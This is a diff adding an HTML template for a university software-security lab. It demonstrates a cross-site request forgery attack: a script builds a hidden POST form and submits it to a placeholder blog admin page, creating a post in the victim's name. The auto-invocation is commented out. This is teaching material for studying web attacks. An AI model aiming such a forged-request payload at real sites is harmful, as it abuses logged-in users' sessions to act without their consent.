@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<!-- 
+This is a code template to forge an HTTP POST request.
+Used for Lab 8 Software Security/Language-based Security.
+-->
+<html>
+<title> Lab 8 Software Security/Language-based Security</title>
+<body>
+<h1>Lab 8 Software Security/Language-based Security</h1>
+<h2>Cross-site Request Forgery Attack, by Phu Phung, customized by "YOUR NAME".</h2>
+<script>
+function CSRF() {
+	//create a <form> element.
+	var form = document.createElement('form');
+	//construct the form
+	form.action = "https://<yourID>.myblog.com/admin/index.php";
+	form.method = 'POST';
+	form.target = '_self';
+	form.innerHTML = "<input type='hidden' name='title' value='An CSRF Attack Post' />" +
+					"<textarea type='hidden' name='text' value='Any comment is welcome!' />";
+	//append the form to the current page.
+	document.body.appendChild(form);
+	//just for the lab report, to capture the screenshot, otherwise, the CSRF 
+	//will be submitted automatically
+	alert('CSRF Attack for Lab 8 is about to happen - By [Your Name]');
+	//submit the form
+	form.submit();
+}
+//call CSRF() to forge an HTTP POST request to the vulnerable server
+//CSRF();
+
+</script>
+</body>
+</html>
